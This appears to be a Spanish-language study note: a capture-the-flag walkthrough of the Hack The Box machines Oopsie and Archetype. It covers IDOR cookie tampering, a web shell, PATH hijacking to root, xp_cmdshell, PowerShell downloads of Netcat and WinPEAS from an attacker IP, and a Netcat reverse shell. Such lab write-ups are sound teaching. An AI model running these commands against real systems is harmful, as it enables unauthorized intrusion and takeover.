

> [!info] Relacionado con
> [[Metodología de Explotación]] · [[Explotación de Servicios - Linux]] · [[Explotación de Servicios - Windows]] · [[Escalada de Privilegios]] · [[Reverse Shells y Post-Explotación]] · [[Prácticas CTF - HTB y VulnHub]]

---

## ① Conceptos clave

### IDOR (Insecure Direct Object Reference)

Vulnerabilidad de control de acceso: la app expone una referencia directa a un objeto (id en URL o cookie) sin verificar permisos. Cambiando el identificador se accede a datos de otros usuarios. OWASP Top 10 (A01:2021).

> [!tip] IDEA CLAVE EN OOPSIE
> Guest tiene `id=2`, admin tiene `id=1`. La app asume que "no existe id=1 visible, está protegido" — pero basta con cambiar el número. Modificando la cookie con `role=admin` e `id=1` se obtiene acceso al panel de administración.

### Web shell y reverse shell

| Tipo | Función |
|------|---------|
| **Web shell** | Fichero PHP subido al servidor, ejecuta comandos desde el navegador |
| **Reverse shell** | El servidor conecta de vuelta a tu máquina (la forma habitual de conseguir shell) |

> [!warning] DETECCIÓN DE SUBIDA NO INTERPRETADA
> Si al abrir el PHP subido el navegador muestra el código fuente en lugar de ejecutarlo, el servidor NO interpreta PHP. Si lo ejecuta y muestra el resultado → subida explotable.

### Shell interactiva (TTY upgrade)

La reverse shell básica no permite moverse con flechas, no muestra usuario/host y se interrumpe fácilmente. El upgrade a TTY completa resuelve esto.

### Reutilización de credenciales

> [!important] PRINCIPIO RECURRENTE
> Toda credencial encontrada (usuario, hash, contraseña) debe probarse contra **otros servicios y usuarios**. En Oopsie: db.php → robert. En Archetype: prod.dtsConfig → SQL → historial → Administrator.

### SMB y sesión nula

Puerto **445**. Permite enumeración sin credenciales (null session). Siempre debe enumerarse — suele contener archivos de configuración con credenciales.

### MSSQL y xp_cmdshell

Puerto **1433**. Con rol sysadmin se puede activar `xp_cmdshell`, que ejecuta comandos del SO desde SQL. Es la vía para "escapar" de la consola SQL hacia una shell de Windows real.

---

## ② Oopsie (Linux) — Flujo completo

```
Nmap (22, 80) → Enum. web + IDOR → Web/Reverse shell → Shell interactiva → Escalada a robert → Escalada a root (PATH hijack)
```

### 2.1 Escaneo y enumeración web

Nmap muestra dos puertos: **22** (SSH) y **80** (HTTP). Se identifican tecnologías con **Wappalyzer** / **WhatWeb** (detecta Apache + HTML5). Revisando código fuente y scripts JS se localiza un login que permite entrar como guest.

> [!tip] BUENAS PRÁCTICAS DE ENUMERACIÓN WEB
> - Inspeccionar código fuente y scripts `.js`: a menudo esconden rutas/endpoints
> - Si aparece un número (ej. `id=2`), probar siempre a cambiarlo
> - Si existe un dominio propio que no resolve, añadirlo a `/etc/hosts`

### 2.2 Explotación del IDOR y robo de cookie

Logueados como guest (`id=2`, `role=guest`), se inspecciona la petición y se localizan `role` e `id` en la cookie. Cambiando `id` a 1 se descubre la cuenta y correo de admin. Sustituyendo `role=admin` e `id` correspondiente → acceso a secciones bloqueadas (Uploads).

### 2.3 Subida de web shell y reverse shell

Con acceso admin se sube una **web shell en PHP**. Para localizar la ruta de subida se usa fuzzing con **[[Feroxbuster|Feroxbuster]]** (también Gobuster / dirsearch) → se descubre `/uploads`.

Verificada la ejecución de comandos, se prepara la reverse shell:

```bash
# Listener en tu Kali
nc -lvnp 4444

# IP y puerto en la reverse shell → IP = 10.10.15.82, puerto = 4444
```

> [!danger] SOLO EN LABORATORIO AUTORIZADO
> Web shells y reverse shells son exclusivas para máquinas HTB y entornos de práctica autorizados. No replicar contra sistemas reales sin permiso.

### 2.4 Flag de usuario y TTY upgrade

```bash
cat user.txt # www-data

# Upgrade a TTY interactiva (3 pasos):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z para suspender
stty raw -echo; fg
# Enter una o dos veces
```

> [!tip] RESULTADO DEL UPGRADE
> La terminal muestra usuario, host y directorio actual. Permite moverse con flechas y deja de interrumpir comandos. Mucho más cómoda para la fase de escalada.

### 2.5 Escalada: www-data → robert

```bash
cd /var/www
ls
cat cdn-cgi/login/db.php # contiene usuario robert y contraseña

su robert # introducir la contraseña encontrada
```

> [!info] PUERTOS INTERNOS
> La base de datos no es accesible desde fuera (el escaneo solo mostró 22 y 80). MySQL está en local. **Solo puedes explotar directamente los puertos abiertos al exterior.** Los internos se ven una vez dentro.

### 2.6 Escalada: robert → root (PATH hijacking)

```bash
id # pertenencia al grupo bugtracker
find / -group bugtracker 2>/dev/null
# → /usr/bin/bugtracker

ls -lh /usr/bin/bugtracker # pertenece al grupo bugtracker, se ejecuta como root (SUID)
strings /usr/bin/bugtracker # revela que ejecuta "cat" sin ruta absoluta
```

> [!important] SECUESTRO DE PATH
> El binario invoca `cat` **sin ruta absoluta** y corre como root. Si anteponemos `/tmp` al PATH, el sistema encuentra nuestro `cat` falso primero.

```bash
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker # pedir un id cualquiera → shell como root
```

> [!warning] NO USAR CAT PARA LEER LA FLAG
> Tras secuestrar PATH, `cat` ya no es el real. Usar `nano root.txt` o cualquier alternativa.

### 2.7 ¿Por qué funciona el PATH hijacking?

Cuando un programa llama a `cat` sin ruta absoluta, el sistema lo busca en PATH (en orden). Por defecto: `/usr/local/bin`, `/usr/bin`, `/bin`... Al anteponer `/tmp`, encuentra nuestro `cat` falso primero. Como el binario corre como root → nuestra shell también.

> [!warning] SOLO FUNCIONA CON RUTA RELATIVA
> Binarios bien programados usan rutas absolutas. Esta técnica solo explota binarios que usan rutas relativas para comandos externos.

---

## ③ Archetype (Windows) — Flujo completo

```
Nmap (445, 1433) → SMB sesión nula → Credenciales en backups → MSSQL (Impacket) → xp_cmdshell → Reverse shell + WinPEAS → Administrator
```

### 3.1 Escaneo inicial

Nmap revela **445** (SMB) y **1433** (MSSQL). No hay web relevante.

> [!tip] CONSEJO DEL INSTRUCTOR
> Mientras corre el escaneo, probar siempre FTP (sesiones anónimas) y la web si existieran.

### 3.2 Enumeración SMB con sesión nula

```bash
# Listar recursos compartidos (sin usuario ni contraseña)
smbclient -N -L //IP/

# Conectarse a un recurso concreto
smbclient -N //IP/backups
dir
get prod.dtsConfig # archivo de configuración con credenciales
```

> [!danger] REGLA NEMOTÉCNICA
> Todo archivo que empiece o termine por "config" **"huele muy mal"**: suele contener usuario y contraseña. `prod.dtsConfig` contiene un usuario SQL, su contraseña y el nombre del host.

### 3.3 Acceso a MSSQL con Impacket

```bash
# Conectar
impacket-mssqlclient NOMBREMAQUINA/usuario@IP -windows-auth

# ¿Somos sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin'); -- devuelve 1 = sí
```

### 3.4 Activación de xp_cmdshell

```bash
-- Activar opciones avanzadas
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Activar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Ejecutar comandos del sistema
EXEC xp_cmdshell 'whoami';
```

> [!important] QUÉ SE CONSIGUE
> Permite ejecutar comandos del SO Windows desde la consola SQL. Es la vía para "escapar" de SQL → shell de Windows real.

### 3.5 Transferencia de Netcat y reverse shell

```bash
# En tu Kali: servidor HTTP
python3 -m http.server 80

# Desde la víctima (vía xp_cmdshell): descarga Netcat con PowerShell
EXEC xp_cmdshell 'powershell wget http://10.10.15.82/nc64.exe -OutFile C:\Users\Public\nc64.exe';

# Listener en tu Kali
nc -lvnp 4444

# Ejecutar Netcat en la víctima
EXEC xp_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe 10.10.15.82 4444';
```

> [!warning] CMD VS POWERSHELL
> `wget` es un alias de **PowerShell**; falla si se lanza en CMD pura. Descargar con PowerShell, ejecutar con CMD. La carpeta `C:\Users\Public` se usa porque todos los usuarios tienen permiso de escritura/ejecución.

```bash
# Flag de usuario
cd C:\Users\sql_svc\Desktop
type user.txt
```

### 3.6 Escalada a Administrator con WinPEAS

```bash
# Descarga (wget es de PowerShell)
powershell wget http://10.10.15.82/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe
```

> [!tip] HALLAZGO DECISIVO
> WinPEAS detecta el **historial de PowerShell** del usuario. En ese historial aparece un comando de backup ejecutado con `Administrator` y su contraseña en texto claro. Con esas credenciales → acceso final.

```bash
# Escalada final (dos opciones)
impacket-psexec administrator:'CONTRASEÑA'@IP

# Alternativa
evil-winrm -i IP -u administrator -p 'CONTRASEÑA'

# Flag de root
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## ④ Herramientas utilizadas

| Herramienta | Objetivo | Fase | Notas |
|-------------|----------|------|-------|
| **Nmap** | Detectar puertos y servicios | Enumeración | `nmap -sV -p- IP` — primer paso en ambas máquinas |
| **Wappalyzer / WhatWeb** | Identificar tecnologías web | Enum. web | `whatweb URL` |
| **[[Feroxbuster]]** | Fuzzing de directorios | Enum. web | Localiza `/uploads` en Oopsie |
| **Gobuster / dirsearch** | Fuzzing de directorios | Enum. web | Alternativas a Feroxbuster |
| **Netcat** | Listener y transferencia | Explotación | En Windows: transferir `nc64.exe` |
| **Python http.server** | Servir archivos por HTTP | Transferencia | `python3 -m http.server 80` |
| **TTY upgrade (pty/stty)** | Shell interactiva | Post-explotación | 3 pasos: pty → Ctrl+Z → stty raw -echo; fg |
| **smbclient** | Enumerar/acceder a SMB | Enumeración | Sesión nula con `-N` |
| **Impacket (suite)** | Protocolos de red | Varias | psexec, mssqlclient, secretsdump |
| **mssqlclient.py** | Cliente MSSQL | Explotación | `impacket-mssqlclient ... -windows-auth` |
| **xp_cmdshell** | Comandos vía SQL | Explotación | Requiere rol sysadmin |
| **WinPEAS / LinPEAS** | Enumeración automática | Escalada | Informe con colores; lo rojo es prioritario |
| **psexec.py** | Ejecución remota | Escalada | `impacket-psexec admin:pass@IP` |
| **evil-winrm** | Shell remota WinRM | Escalada | Alternativa a psexec |
| **[[Hydra]]** | Fuerza bruta | Explotación | http-post-form para formularios web |
| **strings / file** | Analizar binarios | Escalada Linux | Revela `cat` sin ruta absoluta en Oopsie |
| **export PATH** | Secuestro de PATH | Escalada Linux | Cat malicioso en `/tmp` |

---

## ⑤ Resumen de comandos

### Oopsie (Linux)

```bash
nc -lvnp 4444
cat user.txt
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
cat /var/www/cdn-cgi/login/db.php
su robert
id
find / -group bugtracker 2>/dev/null
strings /usr/bin/bugtracker
cd /tmp; echo '/bin/sh' > cat; chmod +x cat; export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

### Archetype (Windows)

```bash
smbclient -N -L //IP/
smbclient -N //IP/backups
impacket-mssqlclient NOMBRE/usuario@IP -windows-auth
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
python3 -m http.server 80
EXEC xp_cmdshell 'powershell wget http://IP/nc64.exe -OutFile C:\Users\Public\nc64.exe';
EXEC xp_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe IP 4444';
impacket-psexec administrator:'PASS'@IP
```

---

## ⑥ Conexión con sesiones anteriores

| Concepto | Conexión |
|----------|----------|
| Enumeración Nmap + fuzzing web | Ya practicados en sesiones previas; aquí se aplican como primer paso |
| SMB y smbclient | Vistos antes por encima; en Archetype se profundiza con sesión nula |
| Reverse shells y Netcat | Ya trabajados; se enlazan con la nueva idea de TTY upgrade |
| Reutilización de credenciales | Clave en ambos: Oopsie (db.php → robert) y Archetype (config → SQL → Administrator) |
| HTB Starting Point | Progresión: Meow → Three → Oopsie y Archetype (Tier 1 con escalada Linux/Windows) |

---

## ⑦ Riesgos y errores comunes

> [!danger] ALCANCE Y AUTORIZACIÓN
> Todas las técnicas son para máquinas HTB y laboratorios autorizados. Web shells, xp_cmdshell o PATH hijacking en sistemas reales sin permiso es **ilegal**.

| Error | Solución |
|-------|----------|
| Olvidar dejar `nc -lvnp` a la escucha antes de la reverse shell | Siempre levantar el listener **antes** |
| Lanzar wget en CMD pura | Usar PowerShell para wget |
| Intentar leer la flag con `cat` tras secuestrar PATH | Usar `nano` u otra alternativa |
| Asumir que la BD es accesible desde fuera | Solo se explotan puertos abiertos al exterior |

---

## ⑧ Checklist de repaso

- [ ] ¿Sé identificar y explotar un IDOR (cambiar id/role en URL o cookie)?
- [ ] ¿Sé subir una web shell y verificar si el servidor interpreta el PHP?
- [ ] ¿Sé montar una reverse shell con listener y IP/puerto correctos?
- [ ] ¿Sé hacer el upgrade a shell interactiva (pty → Ctrl+Z → stty raw -echo; fg)?
- [ ] ¿Sé buscar archivos por grupo con `find` y analizar binarios con `strings`/`file`?
- [ ] ¿Entiendo y sé ejecutar el secuestro de PATH (cat malicioso) para escalar a root?
- [ ] ¿Sé enumerar SMB por sesión nula con `smbclient -N` y descargar archivos config?
- [ ] ¿Sé conectarme a MSSQL con Impacket y comprobar el rol sysadmin?
- [ ] ¿Sé activar y usar `xp_cmdshell` para ejecutar comandos del sistema?
- [ ] ¿Sé transferir Netcat/WinPEAS con `python http.server` + `wget` de PowerShell?
- [ ] ¿Sé interpretar el informe de WinPEAS/LinPEAS (prioridad a lo rojo)?
- [ ] ¿Sé usar `psexec.py` o `evil-winrm` con credenciales de Administrator?


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Chema/Maquinas/Explotación de Máquinas Locales I.md|Explotación de Máquinas Locales I]] — GoBuster, Post-Explotación, SMB / Impacket
- [[../../apuntes Joselu/MODULO3/resumen_master_clase34.md|resumen_master_clase34]] — Netcat / Reverse Shells, Post-Explotación, SMB / Impacket
- [[../../apuntes Chema/Maquinas/Son ROBOTS.md|Son ROBOTS]] — Hydra, Netcat / Reverse Shells, Post-Explotación
- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Netcat / Reverse Shells, Post-Explotación, SMB / Impacket
- [[Son ROBOTS — RickdiculouslyEasy y Mr. Robot.md|Son ROBOTS — RickdiculouslyEasy y Mr. Robot]] — Hydra, Netcat / Reverse Shells, Post-Explotación
- [[Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Hydra, Netcat / Reverse Shells, Post-Explotación

### 🛠️ Herramientas

- [[comandos/DirSearch|DirSearch]]
- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas


> #dirsearch #escalada-privilegios #feroxbuster #gobuster #hack-the-box #hydra #idor #linux #netcat #nmap #pentest #post-explotacion #redes #reverse-shell #smb-impacket #ssh #vulnhub #windows
